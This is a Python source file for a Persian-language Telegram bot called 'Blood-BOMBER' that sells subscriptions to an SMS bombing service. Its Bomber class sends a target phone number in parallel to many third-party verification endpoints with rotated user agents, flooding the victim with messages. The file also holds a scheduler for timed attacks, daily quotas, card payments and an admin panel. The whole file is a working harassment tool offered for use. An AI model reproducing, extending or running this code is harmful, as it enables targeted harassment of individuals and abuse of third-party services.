import random
import threading
import time
import requests
import os
import sqlite3
import telebot
from telebot import types
from flask import Flask
from datetime import datetime, timedelta
import traceback

phone = "+989120000000" 

from services import SERVICES_LIST

# ==========================================
# 1. وب‌سرور برای سلامت پورت (Render)
# ==========================================
app = Flask(__name__)
@app.route('/')
def health(): return "Bot is running!", 200
def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port, use_reloader=False)
threading.Thread(target=run_web, daemon=True).start()

# ==========================================
# 2. تنظیمات و دیتابیس
# ==========================================
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = 6914309071
CARD_NUMBER = "[شماره_کارت_اینجا]" 
DB_FILE = "bot_database.db"
bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

PANEL_IMAGE_URL = "https://i.imgur.com/Z7lvgzO.jpeg"
CHANNEL_1 = "@BloodBomber_Chanel"
LOG_CHANNEL = "@YourLogChannel"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        user_id TEXT PRIMARY KEY, name TEXT, plan TEXT, uses INTEGER, 
        last_daily REAL, sub_expiry REAL, daily_bomb_count INTEGER, last_bomb_date TEXT,
        total_purchases INTEGER DEFAULT 0, free_trial_used INTEGER DEFAULT 0,
        last_bomb_time REAL DEFAULT 0, silent_mode INTEGER DEFAULT 0,
        is_banned INTEGER DEFAULT 0, last_active REAL DEFAULT 0)''')
    c.execute('''CREATE TABLE IF NOT EXISTS schedules (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, phone TEXT, run_time REAL, is_sent INTEGER DEFAULT 0)''')
    conn.commit()
    conn.close()
init_db()

def get_user(user_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row: return {"user_id": row[0], "name": row[1], "plan": row[2], "uses": row[3], "last_daily": row[4], "sub_expiry": row[5], "daily_bomb_count": row[6], "last_bomb_date": row[7], "total_purchases": row[8], "free_trial_used": row[9], "last_bomb_time": row[10], "silent_mode": row[11], "is_banned": row[12], "last_active": row[13]}
    return None

def save_user(user_id, name, plan, uses, last_daily, sub_expiry, daily_bomb_count, last_bomb_date, total_purchases=0, free_trial_used=0, last_bomb_time=0, silent_mode=0, is_banned=0, last_active=0):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO users VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", 
              (user_id, name, plan, uses, last_daily, sub_expiry, daily_bomb_count, last_bomb_date, total_purchases, free_trial_used, last_bomb_time, silent_mode, is_banned, last_active))
    conn.commit()
    conn.close()

user_states, pending_approvals, active_bombers, active_gift_codes = {}, {}, {}, {}

PLANS = {
    "basic": {"name": "پایه (۱ ماهه - روزانه ۳ ارسال)", "price": 150, "days": 30, "daily_limit": 3},
    "pro": {"name": "حرفه‌ای (۳ ماهه - روزانه ۵ ارسال)", "price": 450, "days": 90, "daily_limit": 5},
    "vip": {"name": "ویژه (۱ ساله - روزانه ۱۰ ارسال)", "price": 600, "days": 365, "daily_limit": 10}
}

def is_user_joined(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_1, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return True

def send_join_message(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("📢 عضویت در کانال", url=f"https://t.me/{CHANNEL_1.replace('@', '')}"))
    markup.add(types.InlineKeyboardButton("✅ عضو شدم", callback_data="check_join"))
    bot.send_message(chat_id, "⚠️ **برای استفاده از ربات، ابتدا باید در کانال ما عضو شوید!**", reply_markup=markup, parse_mode='Markdown')

# ==========================================
# 3. هسته بمبر
# ==========================================
class Bomber:
    def __init__(self, phone_number, user_id, silent_mode=False):
        self.phone_number = phone_number
        self.user_id = user_id
        self.silent_mode = silent_mode
        self.services = SERVICES_LIST
        self.session = requests.Session()
        self.stop_event = threading.Event()
        self.success = 0
        self.fail = 0
        self.total_services = len(self.services)

    def send_request(self, service):
        if self.stop_event.is_set(): return
        try:
            data = service['data'](self.phone_number)
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            method = service['method'].upper()
            use_json = service.get('json', False)
            
            if method == 'POST':
                if use_json: resp = self.session.post(service['url'], json=data, headers=headers, timeout=5)
                else: resp = self.session.post(service['url'], data=data, headers=headers, timeout=5)
            else:
                resp = self.session.get(service['url'], params=data, headers=headers, timeout=5)
                
            if resp.status_code in (200, 201, 202, 204): self.success += 1
            else: self.fail += 1
        except:
            self.fail += 1

    def worker(self, subset):
        for service in subset:
            if self.stop_event.is_set(): break
            self.send_request(service)
            time.sleep(random.uniform(0.5, 1.5))

    def start(self):
        if not self.services:
            bot.send_message(self.user_id, "❌ لیست سرویس‌ها خالی است.")
            return
            
        self.success, self.fail = 0, 0
        chunk_size = max(1, self.total_services // 15)
        threads = []
        
        if not self.phone_number.startswith("+"): 
            self.phone_number = "+98" + self.phone_number.lstrip("0")

        status_msg = bot.send_message(self.user_id, f"⏳ **در حال ارسال...**\nمیزان پیشرفت: 0/{self.total_services}", parse_mode='Markdown')
        
        chunks = [self.services[i:i + chunk_size] for i in range(0, self.total_services, chunk_size)]
        for chunk in chunks:
            t = threading.Thread(target=self.worker, args=(chunk,))
            t.start()
            threads.append(t)
                
        def update_status():
            last_update = time.time()
            while any(t.is_alive() for t in threads):
                if time.time() - last_update > 2:
                    done = self.success + self.fail
                    percent = int((done / self.total_services) * 100) if self.total_services > 0 else 0
                    bar = "█" * (percent // 10) + "░" * (10 - (percent // 10))
                    try:
                        bot.edit_message_text(
                            f"⏳ **در حال ارسال...**\n\n✅ موفق: {self.success}\n❌ ناموفق: {self.fail}\n\n📊 [{bar}] {percent}%\nمیزان پیشرفت: {done}/{self.total_services}",
                            self.user_id, status_msg.message_id, parse_mode='Markdown'
                        )
                    except: pass
                    last_update = time.time()
                time.sleep(0.5)
                
        for t in threads: t.join()
        update_status()
        
        percent = int((self.success / self.total_services) * 100) if self.total_services > 0 else 0
        bot.edit_message_text(
            f"🏁 **گزارش نهایی:**\n\n✅ موفق: {self.success}\n❌ ناموفق: {self.fail}\n📊 درصد موفقیت: {percent}%",
            self.user_id, status_msg.message_id, parse_mode='Markdown'
        )
        if self.user_id in active_bombers: del active_bombers[self.user_id]

# ==========================================
# 4. سیستم زمان‌بندی
# ==========================================
def run_scheduler():
    while True:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        now = time.time()
        c.execute("SELECT id, user_id, phone FROM schedules WHERE run_time <= ? AND is_sent = 0", (now,))
        tasks = c.fetchall()
        
        for task in tasks:
            task_id, user_id, phone = task
            user = get_user(user_id)
            if user and not user['is_banned']:
                bomber = Bomber(phone, user_id, user['silent_mode'])
                threading.Thread(target=bomber.start).start()
                c.execute("UPDATE schedules SET is_sent = 1 WHERE id = ?", (task_id,))
        conn.commit()
        conn.close()
        time.sleep(30)

threading.Thread(target=run_scheduler, daemon=True).start()

# ==========================================
# 5. منوها
# ==========================================
def get_main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚀 اجرای بمبر", callback_data="menu_bomb"),
        types.InlineKeyboardButton("⏰ زمان‌بندی", callback_data="menu_schedule")
    )
    markup.add(
        types.InlineKeyboardButton("🛒 خرید اشتراک", callback_data="menu_buy"),
        types.InlineKeyboardButton("📋 حساب کاربری", callback_data="menu_profile")
    )
    markup.add(
        types.InlineKeyboardButton("🎁 جایزه روزانه", callback_data="menu_daily"),
        types.InlineKeyboardButton("🎧 پشتیبانی", callback_data="menu_support")
    )
    markup.add(types.InlineKeyboardButton("🏆 برترین‌ها", callback_data="menu_leaderboard"))
    markup.add(types.InlineKeyboardButton("🔑 کد هدیه", callback_data="menu_gift"))
    return markup

@bot.message_handler(commands=['start'])
def cmd_start(message):
    user_id = str(message.from_user.id)
    if not is_user_joined(user_id):
        send_join_message(message.chat.id)
        return
    user = get_user(user_id)
    if not user:
        save_user(user_id, message.from_user.first_name, "free", 0, 0, 0, 0, "2000-01-01", 0, 0, 0, 0, 0, time.time())
    else:
        if user['is_banned']:
            bot.send_message(message.chat.id, "⛔ **شما از ربات مسدود شده‌اید!**")
            return
        user['last_active'] = time.time()
        save_user(**user)
        
    if user['sub_expiry'] > time.time():
        days_left = (user['sub_expiry'] - time.time()) / 86400
        if 0 < days_left <= 3:
            bot.send_message(message.chat.id, f"⚠️ **توجه!** فقط **{int(days_left)} روز** از اشتراک شما باقی مانده است. لطفاً تمدید کنید.", parse_mode='Markdown')

    bot_info = bot.get_me()
    user_mention = f"[{message.from_user.first_name}](tg://user?id={user_id})"
    bot_mention = f"[Blood-BOMBER](tg://user?id={bot_info.id})"
    caption = f"سلام {user_mention} عزیز! 👋\nبه ربات **{bot_mention}** خوش آمدید."
    try:
        bot.send_photo(message.chat.id, PANEL_IMAGE_URL, caption=caption, reply_markup=get_main_menu(), parse_mode='Markdown')
    except:
        bot.send_message(message.chat.id, caption, reply_markup=get_main_menu(), parse_mode='Markdown')

# ==========================================
# 6. پنل ادمین
# ==========================================
@bot.message_handler(commands=['admin'])
def cmd_admin(message):
    if message.from_user.id != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 آمار کل", callback_data="admin_stats"),
        types.InlineKeyboardButton("📈 کاربران آنلاین", callback_data="admin_online")
    )
    markup.add(
        types.InlineKeyboardButton("👥 لیست کاربران", callback_data="admin_list_users"),
        types.InlineKeyboardButton("🔎 جستجوی کاربر", callback_data="admin_search_user")
    )
    markup.add(
        types.InlineKeyboardButton("💰 شارژ دستی کاربر", callback_data="admin_manual_charge"),
        types.InlineKeyboardButton("🚫 مسدود کردن", callback_data="admin_ban")
    )
    markup.add(
        types.InlineKeyboardButton("✉️ پیام اختصاصی", callback_data="admin_dm"),
        types.InlineKeyboardButton("📢 پیام همگانی", callback_data="admin_broadcast")
    )
    markup.add(
        types.InlineKeyboardButton("🎁 شارژ همگانی", callback_data="admin_bulk_charge"),
        types.InlineKeyboardButton("📉 کسر همگانی", callback_data="admin_bulk_deduct")
    )
    markup.add(
        types.InlineKeyboardButton("🔑 ساخت کد هدیه", callback_data="admin_make_gift"),
        types.InlineKeyboardButton("💾 دریافت بکاپ", callback_data="admin_backup")
    )
    bot.reply_to(message, "👑 **پنل مدیریت**", reply_markup=markup, parse_mode='Markdown')

# ==========================================
# 7. هندلرها (Callback Queries)
# ==========================================
@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    user_id = str(call.from_user.id)
    if not is_user_joined(user_id):
        bot.answer_callback_query(call.id, "⚠️ ابتدا باید در کانال عضو شوید!", show_alert=True)
        return
    user = get_user(user_id)
    
    if call.data == "menu_back":
        try:
            bot.edit_message_media(types.InputMediaPhoto(PANEL_IMAGE_URL, caption="منوی اصلی:", parse_mode='Markdown'), call.message.chat.id, call.message.message_id, reply_markup=get_main_menu())
        except:
            bot.edit_message_text("منوی اصلی:", call.message.chat.id, call.message.message_id, reply_markup=get_main_menu(), parse_mode='Markdown')
    
    elif call.data == "menu_profile":
        plan_name = PLANS[user['plan']]['name'] if user['plan'] in PLANS else "رایگان"
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        vip_status = f"فعال ({int((user['sub_expiry'] - time.time()) / 86400)} روز مانده)" if user['sub_expiry'] > time.time() else "منقضی شده"
        silent_status = "روشن" if user['silent_mode'] else "خاموش"
        text = f"📋 **پروفایل:**\n\n👤 نام: {user['name']}\n🆔 آیدی: `{user_id}`\n📅 تاریخ: `{current_time}`\n💎 پلن: **{plan_name}**\n👑 وضعیت اشتراک: **{vip_status}**\n🕵️ حالت بی‌صدا: **{silent_status}**\n"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔕 تغییر حالت بی‌صدا", callback_data="toggle_silent"))
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "toggle_silent":
        user['silent_mode'] = 1 - user['silent_mode']
        save_user(**user)
        status = "روشن" if user['silent_mode'] else "خاموش"
        bot.answer_callback_query(call.id, f"حالت بی‌صدا {status} شد!", show_alert=True)
        plan_name = PLANS[user['plan']]['name'] if user['plan'] in PLANS else "رایگان"
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        vip_status = f"فعال ({int((user['sub_expiry'] - time.time()) / 86400)} روز مانده)" if user['sub_expiry'] > time.time() else "منقضی شده"
        silent_status = "روشن" if user['silent_mode'] else "خاموش"
        text = f"📋 **پروفایل:**\n\n👤 نام: {user['name']}\n🆔 آیدی: `{user_id}`\n📅 تاریخ: `{current_time}`\n💎 پلن: **{plan_name}**\n👑 وضعیت اشتراک: **{vip_status}**\n🕵️ حالت بی‌صدا: **{silent_status}**\n"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔕 تغییر حالت بی‌صدا", callback_data="toggle_silent"))
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_schedule":
        user_states[user_id] = {"state": "waiting_for_schedule_phone"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
        bot.edit_message_caption("⏰ **زمان‌بندی ارسال:**\nلطفاً شماره و ساعت را به این شکل بفرستید:\n`09123456789 14:30`", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_support":
        user_states[user_id] = {"state": "waiting_for_support"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption("🎧 پیام خود را بنویسید:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data == "menu_daily":
        if time.time() - user['last_daily'] < 86400:
            bot.answer_callback_query(call.id, "⏳ امروز گرفته‌اید!", show_alert=True)
        else:
            user['uses'] += 2
            user['last_daily'] = time.time()
            save_user(**user)
            bot.answer_callback_query(call.id, "🎉 ۲ ارسال رایگان!", show_alert=True)

    elif call.data == "menu_leaderboard":
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("SELECT name, uses, user_id FROM users ORDER BY uses DESC LIMIT 5")
        rows = c.fetchall()
        conn.close()
        if not rows:
            bot.answer_callback_query(call.id, "لیست خالی است.")
            return
        text = "🏆 **۵ کاربر برتر:**\n\n"
        for i, row in enumerate(rows, 1):
            text += f"{i}. 👤 **{row[0]}** (آیدی: `{row[2]}`) ➜ {row[1]} ارسال\n"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data == "menu_gift":
        user_states[user_id] = {"state": "waiting_for_gift"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption("🔑 کد هدیه:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data == "menu_buy":
        text = "🛒 **پلن‌های اشتراک:**\n\n"
        markup = types.InlineKeyboardMarkup(row_width=1)
        for key, plan in PLANS.items():
            markup.add(types.InlineKeyboardButton(f"{plan['name']} | {plan['price']} تومان", callback_data=f"buy_{key}"))
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_back"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data.startswith("buy_"):
        plan_key = call.data.replace("buy_", "")
        plan = PLANS[plan_key]
        user_states[user_id] = {"selected_plan": plan_key}
        text = f"✅ پلن **{plan['name']}** انتخاب شد.\n\n💳 مبلغ **{plan['price']} هزار تومان** را واریز کنید.\n\n📸 سپس **عکس رسید** را بفرستید."
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("💳 اطلاعات کارت", callback_data=f"show_card_{plan_key}"))
        markup.add(types.InlineKeyboardButton("🔙 بازگشت", callback_data="menu_buy"))
        bot.edit_message_caption(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    elif call.data.startswith("show_card_"):
        bot.answer_callback_query(call.id)
        text = f"💳 **شماره کارت برای واریز:**\n\n`{CARD_NUMBER}`\n\n(برای کپی، روی شماره کارت ضربه بزنید یا نگه دارید)"
        bot.send_message(call.message.chat.id, text, parse_mode='Markdown')

    elif call.data == "menu_bomb":
        if time.time() - user['last_bomb_time'] < 120:
            remaining = int(120 - (time.time() - user['last_bomb_time']))
            bot.answer_callback_query(call.id, f"⏳ لطفاً {remaining} ثانیه صبر کنید (آنتی‌اسپم).", show_alert=True)
            return
        if user['sub_expiry'] < time.time():
            bot.answer_callback_query(call.id, "❌ اشتراک شما منقضی شده! لطفاً تمدید کنید.", show_alert=True)
            return
        today = datetime.now().strftime("%Y-%m-%d")
        if user['last_bomb_date'] != today:
            user['last_bomb_date'] = today
            user['daily_bomb_count'] = 0
        plan_info = PLANS.get(user['plan'], {"daily_limit": 3})
        max_daily = plan_info["daily_limit"]
        if user['daily_bomb_count'] >= max_daily:
            bot.answer_callback_query(call.id, f"⚠️ سهمیه روزانه ({max_daily} ارسال) پر شده!", show_alert=True)
            return
        user_states[user_id] = {"state": "waiting_for_phone"}
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 انصراف", callback_data="menu_back"))
        bot.edit_message_caption(f"📞 **شماره را وارد کنید:**\n(سهمیه امروز شما: {max_daily - user['daily_bomb_count']} عدد)", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode='Markdown')

    # ================= ادمین =================
    elif call.data.startswith("admin_") and call.from_user.id == ADMIN_ID:
        if call.data == "admin_stats":
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM users")
            total_users = c.fetchone()[0]
            c.execute("SELECT COUNT(*) FROM users WHERE sub_expiry > ?", (time.time(),))
            active_vips = c.fetchone()[0]
            c.execute("SELECT SUM(uses) FROM users")
            total_uses = c.fetchone()[0] or 0
            conn.close()
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, f"📊 **آمار کل:**\n\n👥 کاربران: {total_users}\n👑 اشتراک‌های فعال: {active_vips}\n📤 کل ارسال‌ها: {total_uses}", parse_mode='Markdown')

        elif call.data == "admin_online":
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("SELECT COUNT(*) FROM users WHERE last_active > ?", (time.time() - 86400,))
            online_users = c.fetchone()[0]
            conn.close()
            bot.answer_callback_query(call.id)
            bot.send_message(call.message.chat.id, f"📈 **کاربران آنلاین (۲۴ ساعت گذشته):** {online_users} نفر", parse_mode='Markdown')

        elif call.data == "admin_list_users":
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("SELECT user_id, name, plan, uses FROM users ORDER BY uses DESC LIMIT 10")
            users = c.fetchall()
            conn.close()
            if not users:
                bot.answer_callback_query(call.id, "هیچ کاربری یافت نشد.")
                return
            text = "👥 **لیست ۱۰ کاربر برتر:**\n\n"
            for u in users:
                plan = PLANS.get(u[2], {}).get('name', "رایگان") if u[2] != 'free' else "رایگان"
                text += f"👤 {u[1]} | آیدی: `{u[0]}` | پلن: {plan} | ارسال: {u[3]}\n"
            bot.send_message(call.message.chat.id, text, parse_mode='Markdown')

        elif call.data == "admin_search_user":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(call.message.chat.id, "🔎 آیدی عددی کاربر را برای جستجو بفرستید:")
            bot.register_next_step_handler(msg, process_search_user)

        elif call.data == "admin_manual_charge":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(call.message.chat.id, "💰 آیدی عددی کاربری که می‌خواهید شارژ کنید را بفرستید:")
            bot.register_next_step_handler(msg, process_manual_charge_id)

        elif call.data == "admin_ban":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(call.message.chat.id, "🚫 آیدی عددی کاربری که می‌خواهید مسدود/آزاد کنید را بفرستید:")
            bot.register_next_step_handler(msg, process_ban_user)

        elif call.data == "admin_dm":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(call.message.chat.id, "✉️ فرمت: `USER_ID MESSAGE`\n(آیدی عددی و متن پیام):")
            bot.register_next_step_handler(msg, process_dm)

        elif call.data == "admin_bulk_charge":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(call.message.chat.id, "🎁 چند روز به اشتراک همه کاربران اضافه کنم؟ (فقط عدد):")
            bot.register_next_step_handler(msg, process_bulk_charge)

        elif call.data == "admin_bulk_deduct":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(call.message.chat.id, "📉 چند روز از اشتراک همه کاربران کم کنم؟ (فقط عدد):")
            bot.register_next_step_handler(msg, process_bulk_deduct)

        elif call.data == "admin_broadcast":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(call.message.chat.id, "📝 متن پیام همگانی:")
            bot.register_next_step_handler(msg, send_broadcast)

        elif call.data == "admin_make_gift":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(call.message.chat.id, "🔑 فرمت: `CODE DAYS` (مثال: `WELCOME 5`):")
            bot.register_next_step_handler(msg, process_make_gift)

        elif call.data == "admin_backup":
            bot.answer_callback_query(call.id)
            if os.path.exists(DB_FILE):
                with open(DB_FILE, 'rb') as f:
                    bot.send_document(ADMIN_ID, f)

# ==========================================
# 8. دریافت ورودی‌ها
# ==========================================
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    user_id = str(message.from_user.id)
    if not is_user_joined(user_id):
        send_join_message(message.chat.id)
        return
    if "selected_plan" not in user_states.get(user_id, {}):
        bot.reply_to(message, "⚠️ ابتدا از منو یک پلن انتخاب کنید.")
        return
    plan_key = user_states[user_id]["selected_plan"]
    plan = PLANS[plan_key]
    req_id = f"{user_id}_{int(time.time())}"
    pending_approvals[req_id] = {"user_id": user_id, "plan": plan_key}
    bot.reply_to(message, "✅ رسید دریافت شد. منتظر تایید باشید.")
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("✅ تایید", callback_data=f"admin_approve_{req_id}"),
        types.InlineKeyboardButton("❌ رد", callback_data=f"admin_reject_{req_id}")
    )
    bot.send_message(ADMIN_ID, f"📩 **رسید:**\nکاربر: `{user_id}`\nپلن: **{plan['name']}**", reply_markup=markup, parse_mode='Markdown')
    bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
    del user_states[user_id]

@bot.message_handler(func=lambda message: True)
def check_join_before_text(message):
    user_id = str(message.from_user.id)
    if message.from_user.id == ADMIN_ID:
        pass
    elif not is_user_joined(user_id):
        send_join_message(message.chat.id)
        return
    process_text_inputs(message)

def process_text_inputs(message):
    user_id = str(message.from_user.id)
    state = user_states[user_id].get("state") if user_id in user_states else None
    user = get_user(user_id)
    if not user: return
    
    if message.text == "لغو":
        del user_states[user_id]
        bot.reply_to(message, "عملیات لغو شد.", reply_markup=get_main_menu())
        return
        
    if state == "waiting_for_support":
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("✍️ پاسخ", callback_data=f"admin_reply_{user_id}"))
        bot.send_message(ADMIN_ID, f"🎧 پیام از `{user_id}`:\n\n{message.text}", reply_markup=markup)
        bot.reply_to(message, "✅ پیام ارسال شد.")
        del user_states[user_id]

    elif state == "waiting_for_schedule_phone":
        try:
            parts = message.text.split()
            phone = parts[0].strip()
            time_str = parts[1].strip()
            now = datetime.now()
            target_time = datetime.strptime(time_str, "%H:%M").replace(year=now.year, month=now.month, day=now.day)
            if target_time < now: target_time += timedelta(days=1)
            run_time = target_time.timestamp()
            
            conn = sqlite3.connect(DB_FILE)
            c = conn.cursor()
            c.execute("INSERT INTO schedules (user_id, phone, run_time) VALUES (?, ?, ?)", (user_id, phone, run_time))
            conn.commit()
            conn.close()
            
            bot.reply_to(message, f"✅ **زمان‌بندی شد!**\n📞 {phone}\n⏰ {target_time.strftime('%Y-%m-%d %H:%M')}")
            del user_states[user_id]
        except:
            bot.reply_to(message, "❌ فرمت اشتباه. مثال:\n`09123456789 14:30`", parse_mode='Markdown')

    elif state == "waiting_for_phone":
        if user['sub_expiry'] < time.time():
            bot.reply_to(message, "❌ اشتراک شما منقضی شده است!")
            del user_states[user_id]
            return
        phone = message.text.strip().replace(" ", "")
        if len(phone) < 10 or not phone.isdigit():
            bot.reply_to(message, "❌ فرمت نامعتبر. لطفاً فقط یک شماره معتبر وارد کنید. (مثال: 09123456789)")
            return
        
        today = datetime.now().strftime("%Y-%m-%d")
        if user['last_bomb_date'] != today:
            user['last_bomb_date'] = today
            user['daily_bomb_count'] = 0
            
        plan_info = PLANS.get(user['plan'], {"daily_limit": 3})
        if user['daily_bomb_count'] + 1 > plan_info["daily_limit"]:
            bot.reply_to(message, f"❌ سهمیه امروز شما ({plan_info['daily_limit']} عدد) پر شده است!")
            del user_states[user_id]
            return
            
        user['daily_bomb_count'] += 1
        user['last_bomb_time'] = time.time()
        save_user(**user)
        del user_states[user_id]
        
        bot.reply_to(message, f"🚀 **شروع شد!** هدف: `{phone}`", parse_mode='Markdown')
        bomber = Bomber(phone, user_id, user['silent_mode'])
        active_bombers[user_id] = bomber
        threading.Thread(target=bomber.start).start()

    elif state == "waiting_for_gift":
        code = message.text.strip().upper()
        del user_states[user_id]
        if code in active_gift_codes and active_gift_codes[code]["uses"] > 0:
            amount = active_gift_codes[code]["amount"]
            active_gift_codes[code]["uses"] -= 1
            user['sub_expiry'] += (amount * 86400)
            save_user(**user)
            bot.reply_to(message, f"🎁 {amount} روز به اشتراک شما اضافه شد.")
        else:
            bot.reply_to(message, "❌ کد نامعتبر.")

# ==========================================
# 9. توابع کمکی ادمین (شامل شارژ دستی)
# ==========================================
def process_manual_charge_id(message):
    if message.from_user.id != ADMIN_ID: return
    uid = message.text.strip()
    user = get_user(uid)
    if user:
        user_states[ADMIN_ID] = {"charge_user_id": uid}
        msg = bot.send_message(ADMIN_ID, f"کاربر **{user['name']}** پیدا شد.\nچند روز به اشتراکش اضافه کنم؟ (فقط عدد):")
        bot.register_next_step_handler(msg, process_manual_charge_days)
    else:
        bot.reply_to(message, "❌ کاربر یافت نشد.")

def process_manual_charge_days(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        days = int(message.text.strip())
        uid = user_states[ADMIN_ID]["charge_user_id"]
        user = get_user(uid)
        if user:
            user['sub_expiry'] += (days * 86400)
            save_user(**user)
            bot.reply_to(message, f"✅ {days} روز به اشتراک `{user['name']}` اضافه شد.")
            try: bot.send_message(uid, f"🎁 **ادمین {days} روز به اشتراک شما اضافه کرد!**")
            except: pass
        else:
            bot.reply_to(message, "❌ خطا در پیدا کردن کاربر.")
        del user_states[ADMIN_ID]
    except:
        bot.reply_to(message, "❌ لطفاً فقط یک عدد بفرستید.")

def process_search_user(message):
    if message.from_user.id != ADMIN_ID: return
    uid = message.text.strip()
    user = get_user(uid)
    if user:
        expiry = datetime.fromtimestamp(user['sub_expiry']).strftime("%Y-%m-%d")
        status = "مسدود" if user['is_banned'] else "فعال"
        text = f"👤 **مشخصات کاربر:**\n\n🆔 آیدی: `{uid}`\n👤 نام: {user['name']}\n💎 پلن: {user['plan']}\n📅 انقضا: {expiry}\n📤 ارسال‌ها: {user['uses']}\n🚫 وضعیت: {status}"
        bot.reply_to(message, text, parse_mode='Markdown')
    else:
        bot.reply_to(message, "❌ کاربر یافت نشد.")

def process_ban_user(message):
    if message.from_user.id != ADMIN_ID: return
    uid = message.text.strip()
    user = get_user(uid)
    if user:
        user['is_banned'] = 1 - user['is_banned']
        save_user(**user)
        status = "مسدود" if user['is_banned'] else "آزاد"
        bot.reply_to(message, f"✅ کاربر `{uid}` {status} شد.")
    else:
        bot.reply_to(message, "❌ کاربر یافت نشد.")

def process_dm(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        parts = message.text.split(maxsplit=1)
        uid = parts[0].strip()
        text = parts[1].strip()
        bot.send_message(uid, f"✉️ **پیام از ادمین:**\n\n{text}", parse_mode='Markdown')
        bot.reply_to(message, "✅ پیام ارسال شد.")
    except:
        bot.reply_to(message, "❌ فرمت اشتباه. مثال: `12345678 سلام`")

def process_bulk_charge(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        amount = int(message.text.strip())
        if amount <= 0: return
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("UPDATE users SET sub_expiry = sub_expiry + ?", (amount * 86400,))
        conn.commit()
        conn.close()
        bot.send_message(ADMIN_ID, f"✅ {amount} روز به اشتراک همه کاربران اضافه شد.")
    except: pass

def process_bulk_deduct(message):
    if message.from_user.id != ADMIN_ID: return
    try:
        amount = int(message.text.strip())
        if amount <= 0: return
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        c.execute("UPDATE users SET sub_expiry = sub_expiry - ?", (amount * 86400,))
        conn.commit()
        conn.close()
        bot.send_message(ADMIN_ID, f"✅ {amount} روز از اشتراک همه کاربران کم شد.")
    except: pass

